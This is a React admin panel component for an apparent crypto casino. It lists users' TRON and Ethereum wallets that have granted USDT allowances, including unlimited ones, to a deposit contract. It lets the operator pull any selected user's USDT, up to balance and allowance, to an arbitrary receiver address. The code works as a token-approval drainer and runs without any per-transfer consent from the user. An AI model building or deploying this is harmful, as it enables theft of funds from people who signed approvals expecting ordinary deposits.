'use client';

import { useState, useEffect, useCallback } from 'react';
import { useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
import { useAccount, usePublicClient, useWalletClient } from 'wagmi';
import { createClient } from '@/lib/supabase';
import { getActiveTronConfig, getActiveNetworkConfig, SUPPORTED_TOKENS, CONTRACTS } from '@/lib/contracts';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { Badge } from '@/components/ui/badge';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Loader2, Send, RefreshCw, AlertCircle, CheckCircle, Users, Wallet } from 'lucide-react';
import { toast } from 'sonner';
import { formatUnits, parseUnits, erc20Abi } from 'viem';

interface UserData {
  id: string;
  wallet_address: string;
}

interface UserWithData extends UserData {
  allowance: bigint;
  balance: bigint;
  network: 'tron' | 'evm';
  hasApproval?: boolean;
  isUnlimited?: boolean;
}

// Helper to check if address is a TRON address (starts with T or t, case-insensitive)
const isTronAddress = (address: string): boolean => {
  return !!address && (address.startsWith('T') || address.startsWith('t')) && address.length === 34;
};

// Helper to check if address is an EVM address (starts with 0x)
const isEvmAddress = (address: string): boolean => {
  return !!address && address.startsWith('0x') && address.length === 42;
};

const UNLIMITED_THRESHOLD = BigInt(10) ** BigInt(30);

export function PermitTransfer() {
  const { address: tronAddress, connected: isTronConnected } = useWallet();
  const { address: evmAddress, isConnected: isEvmConnected } = useAccount();
  const publicClient = usePublicClient();
  const { data: walletClient } = useWalletClient();
  const supabase = createClient();
  
  // TRON state
  const [tronUsersWithData, setTronUsersWithData] = useState<UserWithData[]>([]);
  const [isTronDataLoading, setIsTronDataLoading] = useState(false);
  
  // EVM state
  const [evmUsers, setEvmUsers] = useState<UserData[]>([]);
  const [evmUsersWithData, setEvmUsersWithData] = useState<UserWithData[]>([]);
  const [isEvmLoading, setIsEvmLoading] = useState(true);
  const [isEvmDataLoading, setIsEvmDataLoading] = useState(false);
  
  // Shared state
  const [selectedUser, setSelectedUser] = useState<UserWithData | null>(null);
  const [receiverAddress, setReceiverAddress] = useState('');
  const [transferAmount, setTransferAmount] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [txSuccess, setTxSuccess] = useState(false);
  const [activeTab, setActiveTab] = useState<'tron' | 'evm'>('tron');
  
  // Manual address check state
  const [manualAddress, setManualAddress] = useState('');
  const [manualCheckResult, setManualCheckResult] = useState<string | null>(null);
  const [isCheckingManual, setIsCheckingManual] = useState(false);

  // Load EVM users from database
  const loadEvmUsers = useCallback(async () => {
    setIsEvmLoading(true);
    try {
      const { data, error } = await supabase
        .from('users')
        .select('id, wallet_address')
        .not('wallet_address', 'is', null)
        .like('wallet_address', '0x%')
        .order('created_at', { ascending: false });
      
      if (error) {
        console.error('Error loading EVM users:', error);
        return;
      }
      
      const validEvmUsers = (data || []).filter((u: any) => isEvmAddress(u.wallet_address));
      setEvmUsers(validEvmUsers);
    } catch (error) {
      console.error('Error:', error);
    } finally {
      setIsEvmLoading(false);
    }
  }, [supabase]);

  // Fetch TRON approvals via server-side API (more reliable, uses TronGrid API key)
  const fetchTronData = useCallback(async () => {
    setIsTronDataLoading(true);
    try {
      console.log('[TRON] Fetching approvals via API...');
      
      // Try server-side API first (most reliable)
      const response = await fetch('/api/admin/tron-approvals');
      const data = await response.json();
      
      console.log('[TRON] API Response:', JSON.stringify(data, null, 2));
      
      if (response.ok && !data.error) {
        console.log('='.repeat(50));
        console.log(`[TRON] Network: ${data.network}`);
        console.log(`[TRON] Casino Contract: ${data.casinoContract}`);
        console.log(`[TRON] USDT Contract: ${data.usdtContract}`);
        console.log(`[TRON] Total users checked: ${data.totalUsersChecked || 0}`);
        console.log(`[TRON] Users with balance > 0: ${data.users?.length || 0}`);
        console.log('='.repeat(50));
        
        if (data.users?.length > 0) {
          console.log('[TRON] Users with USDT balance:');
          data.users.forEach((u: any, i: number) => {
            const balance = Number(u.balance) / 1e6;
            const allowance = Number(u.allowance) / 1e6;
            const approved = u.hasApproval ? '✓' : '✗';
            console.log(`  ${i + 1}. ${u.wallet_address}: ${balance.toFixed(2)} USDT (Approved: ${approved}, Allowance: ${allowance.toFixed(2)})`);
          });
        } else {
          console.log('[TRON] No users with USDT balance found');
          toast.info(`Checked ${data.totalUsersChecked} users, no USDT balances found`);
        }
        
        const usersData: UserWithData[] = (data.users || []).map((u: any) => ({
          id: u.id,
          wallet_address: u.wallet_address,
          allowance: BigInt(u.allowance || '0'),
          balance: BigInt(u.balance || '0'),
          network: 'tron' as const,
          hasApproval: u.hasApproval,
          isUnlimited: u.isUnlimited
        }));
        
        setTronUsersWithData(usersData);
        return;
      }
      
      // API returned error
      console.error('[TRON] API error:', data.error);
      toast.error(`TRON API error: ${data.error}`);
      
      // Fallback to client-side if API fails
      console.warn('[TRON] Trying client-side approach...');
      
      const tronWeb = (window as any).tronWeb || (window as any).tronLink?.tronWeb;
      if (!tronWeb || !tronWeb.ready) {
        console.warn('TronWeb not available');
        toast.error('Could not fetch TRON approvals. Please ensure TronLink is connected.');
        setTronUsersWithData([]);
        return;
      }

      const tronConfig = getActiveTronConfig();
      const usdtContract = await tronWeb.contract().at(tronConfig.usdt);
      
      // Fallback: load from database and check each address
      const { data: dbUsers } = await supabase
        .from('users')
        .select('id, wallet_address')
        .not('wallet_address', 'is', null)
        .like('wallet_address', 'T%');
      
      const usersData: UserWithData[] = [];
      
      for (const user of dbUsers || []) {
        if (!isTronAddress(user.wallet_address)) continue;
        
        try {
          const [allowanceResult, balanceResult] = await Promise.all([
            usdtContract.allowance(user.wallet_address, tronConfig.casinoDepositAddress).call(),
            usdtContract.balanceOf(user.wallet_address).call()
          ]);
          
          const allowance = allowanceResult?.toString ? BigInt(allowanceResult.toString()) : BigInt(0);
          const balance = balanceResult?.toString ? BigInt(balanceResult.toString()) : BigInt(0);
          
          if (allowance > BigInt(0)) {
            usersData.push({
              id: user.id,
              wallet_address: user.wallet_address,
              allowance,
              balance,
              network: 'tron',
              hasApproval: true,
              isUnlimited: allowance >= UNLIMITED_THRESHOLD
            });
          }
        } catch (err) {
          console.warn(`Failed to check ${user.wallet_address}:`, err);
        }
      }
      
      console.log(`Client-side found ${usersData.length} users with approvals`);
      setTronUsersWithData(usersData);
      
    } catch (error) {
      console.error('Error fetching TRON data:', error);
      toast.error('Failed to fetch TRON approvals');
    } finally {
      setIsTronDataLoading(false);
    }
  }, [supabase]);

  // Fetch EVM approvals via server-side API
  const fetchEvmData = useCallback(async () => {
    setIsEvmDataLoading(true);
    try {
      console.log('Fetching EVM approvals via API...');
      
      // Try server-side API first
      const response = await fetch('/api/admin/evm-approvals');
      
      if (response.ok) {
        const data = await response.json();
        console.log(`API returned ${data.users?.length || 0} users with EVM approvals`);
        
        const usersData: UserWithData[] = (data.users || []).map((u: any) => ({
          id: u.id,
          wallet_address: u.wallet_address,
          allowance: BigInt(u.allowance),
          balance: BigInt(u.balance),
          network: 'evm' as const
        }));
        
        setEvmUsersWithData(usersData);
        return;
      }
      
      // Fallback to client-side if API fails and publicClient is available
      console.warn('API failed, trying client-side approach...');
      
      if (!publicClient || evmUsers.length === 0) {
        setEvmUsersWithData([]);
        return;
      }

      const networkConfig = getActiveNetworkConfig();
      const usdtAddress = SUPPORTED_TOKENS.USDT.address as `0x${string}`;
      const casinoAddress = networkConfig.casinoDepositAddress as `0x${string}`;
      
      const usersData: UserWithData[] = [];
      
      for (const user of evmUsers) {
        try {
          const userAddress = user.wallet_address as `0x${string}`;
          
          const [allowance, balance] = await Promise.all([
            publicClient.readContract({
              address: usdtAddress,
              abi: erc20Abi,
              functionName: 'allowance',
              args: [userAddress, casinoAddress]
            }),
            publicClient.readContract({
              address: usdtAddress,
              abi: erc20Abi,
              functionName: 'balanceOf',
              args: [userAddress]
            })
          ]);

          if (allowance > BigInt(0)) {
            usersData.push({
              ...user,
              allowance,
              balance,
              network: 'evm'
            });
          }
        } catch (err) {
          console.warn(`Failed to fetch EVM data for ${user.wallet_address}:`, err);
        }
      }
      
      setEvmUsersWithData(usersData);
    } catch (error) {
      console.error('Error fetching EVM data:', error);
      toast.error('Failed to fetch EVM approvals');
    } finally {
      setIsEvmDataLoading(false);
    }
  }, [evmUsers, publicClient]);

  // Load EVM users on mount (for fallback)
  useEffect(() => {
    loadEvmUsers();
  }, [loadEvmUsers]);

  // Fetch TRON data when wallet connected
  useEffect(() => {
    if (isTronConnected) {
      fetchTronData();
    }
  }, [isTronConnected, fetchTronData]);

  // Fetch EVM data when wallet connected
  useEffect(() => {
    if (isEvmConnected) {
      fetchEvmData();
    }
  }, [isEvmConnected, fetchEvmData]);

  // Execute TRON transfer
  const executeTronTransfer = async () => {
    if (!selectedUser || !receiverAddress || !transferAmount) {
      toast.error('Please fill in all fields');
      return;
    }

    if (!isTronAddress(receiverAddress)) {
      toast.error('Invalid TRON receiver address format');
      return;
    }

    const amount = BigInt(Math.floor(parseFloat(transferAmount) * 1e6));

    if (amount <= BigInt(0)) {
      toast.error('Amount must be greater than 0');
      return;
    }

    if (amount > selectedUser.allowance) {
      toast.error('Transfer amount exceeds user allowance');
      return;
    }

    if (amount > selectedUser.balance) {
      toast.error('Transfer amount exceeds user balance');
      return;
    }

    try {
      setIsProcessing(true);
      setTxSuccess(false);

      const tronWeb = (window as any).tronWeb || (window as any).tronLink?.tronWeb;
      if (!tronWeb || !tronWeb.ready) {
        toast.error('TronLink wallet not detected or not ready');
        return;
      }

      const tronConfig = getActiveTronConfig();
      const casinoContract = await tronWeb.contract().at(tronConfig.casinoDepositAddress);
      
      const tx = await casinoContract.transferFromUser(
        tronConfig.usdt,
        selectedUser.wallet_address,
        receiverAddress,
        amount.toString()
      ).send();

      console.log('TRON Transfer tx:', tx);
      toast.success('Transfer submitted successfully!');
      setTxSuccess(true);
      
      setSelectedUser(null);
      setReceiverAddress('');
      setTransferAmount('');
      
      setTimeout(() => fetchTronData(), 3000);
    } catch (error: any) {
      console.error('TRON Transfer error:', error);
      toast.error(error.message || 'Transfer failed');
    } finally {
      setIsProcessing(false);
    }
  };

  // Execute EVM transfer
  const executeEvmTransfer = async () => {
    if (!selectedUser || !receiverAddress || !transferAmount || !walletClient) {
      toast.error('Please fill in all fields');
      return;
    }

    if (!isEvmAddress(receiverAddress)) {
      toast.error('Invalid EVM receiver address format');
      return;
    }

    const amount = parseUnits(transferAmount, 6); // USDT has 6 decimals

    if (amount <= BigInt(0)) {
      toast.error('Amount must be greater than 0');
      return;
    }

    if (amount > selectedUser.allowance) {
      toast.error('Transfer amount exceeds user allowance');
      return;
    }

    if (amount > selectedUser.balance) {
      toast.error('Transfer amount exceeds user balance');
      return;
    }

    try {
      setIsProcessing(true);
      setTxSuccess(false);

      const networkConfig = getActiveNetworkConfig();
      const casinoAddress = networkConfig.casinoDepositAddress as `0x${string}`;
      const usdtAddress = SUPPORTED_TOKENS.USDT.address as `0x${string}`;

      // Call transferFromUser on the CasinoDeposit contract
      const hash = await walletClient.writeContract({
        address: casinoAddress,
        abi: CONTRACTS.CasinoDeposit.abi,
        functionName: 'transferFromUser',
        args: [
          usdtAddress,
          selectedUser.wallet_address as `0x${string}`,
          receiverAddress as `0x${string}`,
          amount
        ]
      });

      console.log('EVM Transfer tx:', hash);
      toast.success('Transfer submitted successfully!');
      setTxSuccess(true);
      
      setSelectedUser(null);
      setReceiverAddress('');
      setTransferAmount('');
      
      setTimeout(() => fetchEvmData(), 3000);
    } catch (error: any) {
      console.error('EVM Transfer error:', error);
      toast.error(error.message || 'Transfer failed');
    } finally {
      setIsProcessing(false);
    }
  };

  const executeTransfer = () => {
    if (selectedUser?.network === 'tron') {
      executeTronTransfer();
    } else {
      executeEvmTransfer();
    }
  };

  const formatAddress = (addr: string) => {
    return `${addr.slice(0, 8)}...${addr.slice(-6)}`;
  };

  const formatAmount = (amount: bigint, decimals: number = 6) => {
    const num = Number(amount) / Math.pow(10, decimals);
    if (num > 1e15) return '∞';
    return num.toLocaleString(undefined, { maximumFractionDigits: 2 });
  };

  const handleRefresh = () => {
    if (activeTab === 'tron') {
      if (isTronConnected) fetchTronData();
    } else {
      loadEvmUsers();
      if (isEvmConnected && publicClient) fetchEvmData();
    }
  };

  // Manual address check function
  const checkManualAddress = async () => {
    if (!manualAddress) {
      toast.error('Please enter an address');
      return;
    }

    setIsCheckingManual(true);
    setManualCheckResult(null);

    try {
      if (isTronAddress(manualAddress)) {
        // Check TRON address
        const tronWeb = (window as any).tronWeb || (window as any).tronLink?.tronWeb;
        if (!tronWeb || !tronWeb.ready) {
          setManualCheckResult('Error: TronLink not connected');
          return;
        }

        const tronConfig = getActiveTronConfig();
        const usdtContract = await tronWeb.contract().at(tronConfig.usdt);
        
        const [allowanceResult, balanceResult] = await Promise.all([
          usdtContract.allowance(manualAddress, tronConfig.casinoDepositAddress).call(),
          usdtContract.balanceOf(manualAddress).call()
        ]);

        const allowance = allowanceResult?.toString ? BigInt(allowanceResult.toString()) : BigInt(0);
        const balance = balanceResult?.toString ? BigInt(balanceResult.toString()) : BigInt(0);

        setManualCheckResult(
          `TRON Address: ${manualAddress}\n` +
          `Casino Contract: ${tronConfig.casinoDepositAddress}\n` +
          `USDT Allowance: ${formatAmount(allowance)} USDT\n` +
          `USDT Balance: ${formatAmount(balance)} USDT\n` +
          `Has Approval: ${allowance > BigInt(0) ? 'YES ✓' : 'NO ✗'}`
        );

        // If has approval, add to the list
        if (allowance > BigInt(0)) {
          const exists = tronUsersWithData.some(u => u.wallet_address === manualAddress);
          if (!exists) {
            setTronUsersWithData(prev => [...prev, {
              id: manualAddress,
              wallet_address: manualAddress,
              allowance,
              balance,
              network: 'tron',
              hasApproval: allowance > BigInt(0),
              isUnlimited: allowance >= UNLIMITED_THRESHOLD
            }]);
            toast.success('Address added to the list!');
          }
        }
      } else if (isEvmAddress(manualAddress)) {
        // Check EVM address
        if (!publicClient) {
          setManualCheckResult('Error: EVM wallet not connected');
          return;
        }

        const networkConfig = getActiveNetworkConfig();
        const usdtAddress = SUPPORTED_TOKENS.USDT.address as `0x${string}`;
        const casinoAddress = networkConfig.casinoDepositAddress as `0x${string}`;
        const userAddress = manualAddress as `0x${string}`;

        const [allowance, balance] = await Promise.all([
          publicClient.readContract({
            address: usdtAddress,
            abi: erc20Abi,
            functionName: 'allowance',
            args: [userAddress, casinoAddress]
          }),
          publicClient.readContract({
            address: usdtAddress,
            abi: erc20Abi,
            functionName: 'balanceOf',
            args: [userAddress]
          })
        ]);

        setManualCheckResult(
          `EVM Address: ${manualAddress}\n` +
          `Casino Contract: ${casinoAddress}\n` +
          `USDT Allowance: ${formatAmount(allowance)} USDT\n` +
          `USDT Balance: ${formatAmount(balance)} USDT\n` +
          `Has Approval: ${allowance > BigInt(0) ? 'YES ✓' : 'NO ✗'}`
        );

        // If has approval, add to the list
        if (allowance > BigInt(0)) {
          const exists = evmUsersWithData.some(u => u.wallet_address.toLowerCase() === manualAddress.toLowerCase());
          if (!exists) {
            setEvmUsersWithData(prev => [...prev, {
              id: manualAddress,
              wallet_address: manualAddress,
              allowance,
              balance,
              network: 'evm'
            }]);
            toast.success('Address added to the list!');
          }
        }
      } else {
        setManualCheckResult('Invalid address format. Must start with T (TRON) or 0x (EVM)');
      }
    } catch (error: any) {
      console.error('Manual check error:', error);
      setManualCheckResult(`Error: ${error.message}`);
    } finally {
      setIsCheckingManual(false);
    }
  };

  const tronLoading = isTronDataLoading;
  const evmLoading = isEvmLoading || isEvmDataLoading;

  const renderUserTable = (users: UserWithData[], loading: boolean, network: 'tron' | 'evm', isWalletConnected: boolean, walletAddress: string | null | undefined) => {
    if (!isWalletConnected) {
      return (
        <div className="flex items-center gap-2 p-4 rounded-lg bg-yellow-500/10 border border-yellow-500/20">
          <Wallet className="h-5 w-5 text-yellow-500" />
          <span className="text-yellow-400">
            Please connect your {network === 'tron' ? 'TRON' : 'EVM'} admin wallet to view approvals
          </span>
        </div>
      );
    }

    return (
      <>
        {/* Connected Wallet Info */}
        <div className="flex items-center gap-2 p-3 rounded-lg bg-casino-brand/10 border border-casino-brand/20">
          <Wallet className="h-4 w-4 text-casino-brand" />
          <span className="text-casino-brand text-sm">
            Connected: {walletAddress?.slice(0, 8)}...{walletAddress?.slice(-6)}
          </span>
        </div>

        {/* Transaction Success Status */}
        {txSuccess && (
          <div className="flex items-center gap-2 p-3 rounded-lg bg-green-500/10 border border-green-500/20">
            <CheckCircle className="h-4 w-4 text-green-400" />
            <span className="text-green-400">Transfer submitted successfully!</span>
          </div>
        )}

        {/* Users with Approvals Table */}
        <div className="rounded-md border border-white/10 overflow-x-auto">
          <Table>
            <TableHeader>
              <TableRow className="border-white/10 hover:bg-transparent">
                <TableHead>{network === 'tron' ? 'TRON' : 'EVM'} Wallet</TableHead>
                <TableHead className="text-center">USDT Balance</TableHead>
                <TableHead className="text-center">Approval Status</TableHead>
                <TableHead>Action</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {loading ? (
                <TableRow>
                  <TableCell colSpan={4} className="text-center py-8">
                    <Loader2 className="h-6 w-6 animate-spin mx-auto mb-2" />
                    Loading {network === 'tron' ? 'TRON' : 'EVM'} users...
                  </TableCell>
                </TableRow>
              ) : users.length === 0 ? (
                <TableRow>
                  <TableCell colSpan={4} className="text-center py-8 text-muted-foreground">
                    <AlertCircle className="h-6 w-6 mx-auto mb-2 opacity-50" />
                    No {network === 'tron' ? 'TRON' : 'EVM'} users with USDT balance found
                  </TableCell>
                </TableRow>
              ) : (
                users.map((user) => {
                  const isSelected = selectedUser?.id === user.id;
                  const hasApproval = user.hasApproval || user.allowance > BigInt(0);
                  
                  return (
                    <TableRow 
                      key={user.id} 
                      className={`border-white/10 cursor-pointer transition-colors ${isSelected ? 'bg-casino-brand/10' : 'hover:bg-white/5'}`}
                      onClick={() => setSelectedUser(isSelected ? null : user)}
                    >
                      <TableCell className="font-mono">
                        <div className="flex items-center gap-2">
                          <Badge 
                            variant="outline" 
                            className={`text-xs ${network === 'tron' ? 'border-red-500/50 text-red-400' : 'border-blue-500/50 text-blue-400'}`}
                          >
                            {network === 'tron' ? 'TRC-20' : 'ERC-20'}
                          </Badge>
                          {formatAddress(user.wallet_address)}
                        </div>
                      </TableCell>
                      <TableCell className="text-center">
                        <span className="text-sm font-medium">
                          {formatAmount(user.balance)} USDT
                        </span>
                      </TableCell>
                      <TableCell className="text-center">
                        {(user as UserWithData).isUnlimited ? (
                          <Badge variant="outline" className="border-green-500/50 text-green-400">
                            ✓ Unlimited
                          </Badge>
                        ) : hasApproval ? (
                          <Badge variant="outline" className="border-green-500/50 text-green-400">
                            ✓ Approved ({formatAmount(user.allowance)})
                          </Badge>
                        ) : (
                          <Badge variant="outline" className="border-yellow-500/50 text-yellow-400">
                            ✗ Not Approved
                          </Badge>
                        )}
                      </TableCell>
                      <TableCell>
                        <Button 
                          size="sm" 
                          variant={isSelected ? "default" : "outline"}
                          className={isSelected ? "bg-casino-brand text-black" : ""}
                        >
                          {isSelected ? 'Selected' : 'Select'}
                        </Button>
                      </TableCell>
                    </TableRow>
                  );
                })
              )}
            </TableBody>
          </Table>
        </div>

        {/* Transfer Form */}
        {selectedUser && selectedUser.network === network && (
          <div className="p-4 rounded-lg border border-casino-brand/30 bg-casino-brand/5 space-y-4">
            <h4 className="font-semibold flex items-center gap-2">
              <CheckCircle className="h-4 w-4 text-casino-brand" />
              Transfer USDT from {formatAddress(selectedUser.wallet_address)}
            </h4>
            
            {/* Warning if not approved */}
            {!(selectedUser.hasApproval || selectedUser.allowance > BigInt(0)) && (
              <div className="flex items-center gap-2 p-3 rounded-lg bg-yellow-500/10 border border-yellow-500/20">
                <AlertCircle className="h-4 w-4 text-yellow-500" />
                <span className="text-yellow-400 text-sm">
                  This user has NOT approved the contract. Transfer will fail unless they approve first.
                </span>
              </div>
            )}
            
            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label>Receiver {network === 'tron' ? 'TRON' : 'EVM'} Address</Label>
                <Input
                  placeholder={network === 'tron' ? 'T...' : '0x...'}
                  value={receiverAddress}
                  onChange={(e) => setReceiverAddress(e.target.value)}
                  className="bg-black/30 border-white/10"
                />
              </div>
              <div className="space-y-2">
                <Label>
                  Amount USDT (Max: {formatAmount(
                    selectedUser.balance < selectedUser.allowance 
                      ? selectedUser.balance 
                      : selectedUser.allowance
                  )})
                </Label>
                <Input
                  type="number"
                  placeholder="0.00"
                  value={transferAmount}
                  onChange={(e) => setTransferAmount(e.target.value)}
                  className="bg-black/30 border-white/10"
                />
              </div>
            </div>

            <Button
              onClick={executeTransfer}
              disabled={isProcessing || !receiverAddress || !transferAmount}
              className="w-full bg-casino-brand text-black hover:bg-casino-brand/90"
            >
              {isProcessing ? (
                <>
                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                  Processing...
                </>
              ) : (
                <>
                  <Send className="mr-2 h-4 w-4" />
                  Transfer USDT
                </>
              )}
            </Button>

            <p className="text-xs text-muted-foreground">
              This will transfer USDT from the selected user to the receiver address. 
              User must have approved the CasinoDeposit contract.
            </p>
          </div>
        )}
      </>
    );
  };

  return (
    <Card className="bg-casino-panel border-white/5">
      <CardHeader>
        <div className="flex items-center justify-between">
          <div>
            <CardTitle className="flex items-center gap-2">
              <Users className="h-5 w-5 text-casino-brand" />
              Admin Transfer
            </CardTitle>
            <CardDescription>
              Transfer USDT from users who have approved the contract on TRON or Ethereum
            </CardDescription>
          </div>
          <Button variant="outline" size="sm" onClick={handleRefresh} disabled={tronLoading || evmLoading}>
            <RefreshCw className={`h-4 w-4 mr-2 ${(tronLoading || evmLoading) ? 'animate-spin' : ''}`} />
            Refresh
          </Button>
        </div>
      </CardHeader>
      <CardContent className="space-y-6">
        <Tabs value={activeTab} onValueChange={(v) => { setActiveTab(v as 'tron' | 'evm'); setSelectedUser(null); }}>
          <TabsList className="grid w-full grid-cols-2">
            <TabsTrigger value="tron" className="data-[state=active]:bg-red-500/20">
              <Badge variant="outline" className="mr-2 border-red-500/50 text-red-400">TRON</Badge>
              TRON Mainnet ({tronUsersWithData.length})
            </TabsTrigger>
            <TabsTrigger value="evm" className="data-[state=active]:bg-blue-500/20">
              <Badge variant="outline" className="mr-2 border-blue-500/50 text-blue-400">ETH</Badge>
              Ethereum Mainnet ({evmUsersWithData.length})
            </TabsTrigger>
          </TabsList>

          <TabsContent value="tron" className="space-y-4 mt-4">
            {renderUserTable(tronUsersWithData, tronLoading, 'tron', isTronConnected, tronAddress)}
          </TabsContent>

          <TabsContent value="evm" className="space-y-4 mt-4">
            {renderUserTable(evmUsersWithData, evmLoading, 'evm', isEvmConnected, evmAddress)}
          </TabsContent>
        </Tabs>

        {/* Manual Address Check */}
        <div className="border-t border-white/10 pt-6">
          <h4 className="text-sm font-semibold mb-3 flex items-center gap-2">
            <AlertCircle className="h-4 w-4" />
            Manual Address Check
          </h4>
          <div className="flex gap-2">
            <Input
              placeholder="Enter TRON (T...) or EVM (0x...) address to check"
              value={manualAddress}
              onChange={(e) => setManualAddress(e.target.value)}
              className="bg-black/30 border-white/10 flex-1"
            />
            <Button 
              onClick={checkManualAddress}
              disabled={isCheckingManual || !manualAddress}
              variant="outline"
            >
              {isCheckingManual ? (
                <Loader2 className="h-4 w-4 animate-spin" />
              ) : (
                'Check'
              )}
            </Button>
          </div>
          {manualCheckResult && (
            <pre className="mt-3 p-3 rounded-lg bg-black/30 border border-white/10 text-xs whitespace-pre-wrap font-mono">
              {manualCheckResult}
            </pre>
          )}
        </div>
      </CardContent>
    </Card>
  );
}
